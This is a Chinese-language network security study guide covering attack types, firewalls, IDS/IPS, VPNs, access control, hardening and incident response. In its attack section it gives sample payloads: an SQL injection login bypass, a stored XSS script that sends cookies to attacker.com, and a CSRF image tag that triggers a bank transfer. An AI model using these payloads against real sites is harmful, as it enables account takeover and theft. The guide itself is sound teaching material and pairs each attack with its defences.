# 网络安全基础

## 概述
网络安全是指保护网络基础设施、数据传输和系统应用免受攻击、损坏或未授权访问的技术和措施。良好的网络安全架构是企业信息安全的基础。

## 一、网络攻击类型

### 1. DDoS攻击（分布式拒绝服务）
```
攻击原理：
[攻击者] → [僵尸网络] → [大量请求] → [目标服务器]
                                      ↓
                              服务器资源耗尽
                              无法响应正常请求
```

**攻击类型：**
| 类型 | 描述 | 防护方法 |
|------|------|----------|
| SYN Flood | 发送大量SYN请求，不完成握手 | SYN Cookie、流量清洗 |
| UDP Flood | 发送大量UDP数据包 | 限速、黑洞路由 |
| HTTP Flood | 发送大量HTTP请求 | WAF、CDN防护 |
| DNS Amplification | 利用DNS服务器放大攻击流量 | DNS服务器加固、流量过滤 |

### 2. 中间人攻击（MITM）
```
正常通信：
[客户端] ←――――――――→ [服务器]

中间人攻击：
[客户端] ←→ [攻击者] ←→ [服务器]
              ↓
          窃取/篡改数据
```

**防护措施：**
- 使用TLS/SSL加密
- 证书固定（Certificate Pinning）
- HSTS（HTTP Strict Transport Security）

### 3. SQL注入
```sql
-- 正常查询
SELECT * FROM users WHERE username = 'admin' AND password = 'password123'

-- SQL注入攻击
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'xxx'

-- 结果：绕过密码验证
```

**防护措施：**
- 参数化查询
- 输入验证和过滤
- 最小权限原则
- WAF防护

### 4. XSS攻击（跨站脚本）
```javascript
// 反射型XSS
// URL: https://example.com/search?q=<script>alert('XSS')</script>

// 存储型XSS
// 评论框输入：<script>document.location='http://attacker.com/cookie?c='+document.cookie</script>

// DOM型XSS
// JavaScript直接将用户输入插入DOM
document.getElementById('output').innerHTML = location.hash.substring(1);
```

**防护措施：**
- 输出编码（HTML Entity Encoding）
- Content Security Policy（CSP）
- HTTPOnly Cookie
- 输入验证

### 5. CSRF攻击（跨站请求伪造）
```
攻击流程：
1. 用户登录银行网站 bank.com
2. 用户访问恶意网站 evil.com
3. evil.com 包含隐藏请求：
   <img src="bank.com/transfer?to=attacker&amount=10000">
4. 银行网站执行转账（因为用户已登录）
```

**防护措施：**
- CSRF Token
- SameSite Cookie属性
- 验证Referer头
- 双重提交Cookie

## 二、防火墙技术

### 1. 防火墙类型
| 类型 | 工作层次 | 特点 |
|------|----------|------|
| 包过滤防火墙 | 网络层 | 基于IP/端口过滤，速度快 |
| 状态检测防火墙 | 网络层+传输层 | 维护连接状态，更安全 |
| 应用层防火墙 | 应用层 | 深度包检测，可识别应用 |
| 下一代防火墙（NGFW） | 多层 | 集成IPS、应用识别、用户识别 |

### 2. 防火墙规则示例
```
# Linux iptables 示例

# 允许已建立的连接
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# 允许SSH
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# 允许HTTP/HTTPS
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# 允许本地回环
iptables -A INPUT -i lo -j ACCEPT

# 默认拒绝其他入站
iptables -A INPUT -j DROP

# 允许出站
iptables -A OUTPUT -j ACCEPT
```

### 3. 防火墙策略
```
策略原则：
1. 默认拒绝（Deny All）
2. 最小权限（只开放必要端口）
3. 分层防御（边界防火墙 + 主机防火墙）
4. 日志记录（记录所有拒绝的连接）
```

## 三、入侵检测与防御

### 1. IDS/IPS
| 类型 | 描述 | 部署位置 |
|------|------|----------|
| NIDS | 网络入侵检测 | 网络边界、核心交换机 |
| HIDS | 主机入侵检测 | 关键服务器 |
| NIPS | 网络入侵防御 | 网络边界 |
| HIPS | 主机入侵防御 | 关键服务器 |

### 2. 检测方法
```
签名检测（Signature-based）：
- 已知攻击特征匹配
- 误报率低，漏报率高（新攻击）
- 需要持续更新签名库

异常检测（Anomaly-based）：
- 建立正常行为基线
- 检测偏离基线的行为
- 可发现未知攻击
- 误报率较高
```

### 3. 常见IDS/IPS产品
- **开源**：Snort、Suricata、OSSEC
- **商业**：Palo Alto、Fortinet、Cisco FirePOWER

## 四、VPN技术

### 1. VPN类型
| 类型 | 协议 | 用途 | 安全性 |
|------|------|------|--------|
| 远程访问VPN | IPSec、SSL | 远程办公 | 高 |
| 站点到站点VPN | IPSec | 分支互联 | 高 |
| 客户端VPN | SSL VPN | Web应用访问 | 中高 |

### 2. VPN协议对比
| 协议 | 优点 | 缺点 | 适用场景 |
|------|------|------|----------|
| IPSec | 安全性高、标准化 | 配置复杂 | 站点到站点 |
| OpenVPN | 开源、灵活 | 需要客户端 | 远程访问 |
| WireGuard | 轻量、快速 | 较新、生态不完善 | 现代VPN |
| SSL VPN | 无需客户端 | 性能较低 | Web应用 |

### 3. WireGuard配置示例
```ini
# /etc/wireguard/wg0.conf
[Interface]
Address = 10.0.0.1/24
ListenPort = 51820
PrivateKey = <服务器私钥>

[Peer]
PublicKey = <客户端公钥>
AllowedIPs = 10.0.0.2/32

# 客户端配置
[Interface]
Address = 10.0.0.2/24
PrivateKey = <客户端私钥>

[Peer]
PublicKey = <服务器公钥>
Endpoint = server.example.com:51820
AllowedIPs = 0.0.0.0/0
```

## 五、访问控制

### 1. AAA认证
```
AAA = Authentication + Authorization + Accounting

Authentication（认证）：
- 身份验证：你是谁？
- 方法：密码、证书、生物特征、多因素认证

Authorization（授权）：
- 权限控制：你能做什么？
- 方法：RBAC、ABAC、ACL

Accounting（记账）：
- 行为审计：你做了什么？
- 方法：日志、审计、报告
```

### 2. 零信任架构
```
传统架构：
[用户] → [网络边界] → [内部资源]
         ↑
       信任内部一切

零信任架构：
[用户] → [认证] → [授权] → [资源]
           ↑
       永不信任，始终验证

原则：
1. 不信任任何设备或用户
2. 最小权限访问
3. 持续验证
4. 微分段
```

### 3. 网络访问控制（NAC）
```
NAC流程：
1. 设备接入网络
2. 认证设备身份
3. 检查设备健康状态（补丁、杀毒等）
4. 根据策略分配VLAN/ACL
5. 持续监控设备状态
6. 违规设备隔离

关键技术：
- 802.1X：端口认证
- RADIUS：认证服务器
- 动态VLAN分配
- 基于角色的访问控制
```

## 六、安全加固

### 1. 服务器加固清单
```
网络层：
□ 关闭不必要端口
□ 配置防火墙规则
□ 禁用不必要服务
□ 使用SSH密钥认证

系统层：
□ 更新系统和软件
□ 配置sudo权限
□ 禁用root远程登录
□ 配置日志审计

应用层：
□ 使用HTTPS
□ 配置安全头（CSP、X-Frame-Options等）
□ 启用访问日志
□ 定期备份
```

### 2. 网络设备加固
```
路由器/交换机加固：
□ 修改默认密码
□ 禁用Telnet，使用SSH
□ 配置ACL限制管理访问
□ 启用日志记录
□ 定期更新固件
□ 禁用不必要服务（CDP、LLDP等）
□ 配置端口安全
□ 启用BPDU保护
```

### 3. 安全基线检查
```bash
# Linux安全基线检查示例

# 检查SSH配置
grep -E "PermitRootLogin|PasswordAuthentication" /etc/ssh/sshd_config

# 检查开放端口
netstat -tlnp

# 检查防火墙状态
iptables -L -n

# 检查用户权限
awk -F: '$3==0{print $1}' /etc/passwd

# 检查日志配置
cat /etc/rsyslog.conf | grep -v "^#" | grep -v "^$"

# 检查密码策略
cat /etc/login.defs | grep -E "PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_MIN_LEN"
```

## 七、安全监控与日志

### 1. 日志类型
| 日志类型 | 来源 | 内容 |
|----------|------|------|
| 系统日志 | 操作系统 | 启动、服务、错误 |
| 安全日志 | 防火墙、IDS | 攻击、入侵、违规 |
| 应用日志 | Web服务器 | 访问、错误、SQL |
| 审计日志 | 数据库 | 数据操作、权限变更 |

### 2. 日志分析工具
- **ELK Stack**：Elasticsearch + Logstash + Kibana
- **Splunk**：商业日志分析平台
- **Graylog**：开源日志管理
- **Fluentd**：日志收集和转发

### 3. SIEM（安全信息和事件管理）
```
SIEM功能：
1. 日志收集：从各设备收集日志
2. 关联分析：发现攻击模式
3. 告警：实时安全告警
4. 报告：合规报告、审计报告
5. 取证：安全事件调查

常见SIEM：
- 商业：Splunk、IBM QRadar、ArcSight
- 开源：OSSIM、Wazuh
```

## 八、应急响应

### 1. 应急响应流程
```
PDCERF模型：
1. Preparation（准备）：预案、工具、培训
2. Detection（检测）：发现安全事件
3. Containment（遏制）：阻止攻击扩散
4. Eradication（根除）：清除威胁
5. Recovery（恢复）：恢复服务
6. Follow-up（总结）：复盘改进
```

### 2. 应急响应清单
```
发现攻击时：
□ 确认攻击类型和范围
□ 隔离受影响系统
□ 收集证据（日志、内存镜像）
□ 通知相关方
□ 启动应急预案

处理过程中：
□ 记录所有操作
□ 保护证据链
□ 与管理层沟通
□ 协调外部资源

恢复后：
□ 验证系统安全
□ 更新安全策略
□ 编写事件报告
□ 进行复盘培训
```

---

**学习要点：**
1. 理解常见网络攻击类型和防护方法
2. 掌握防火墙配置和安全策略
3. 了解VPN和访问控制技术
4. 学会安全加固和日志分析
5. 掌握应急响应流程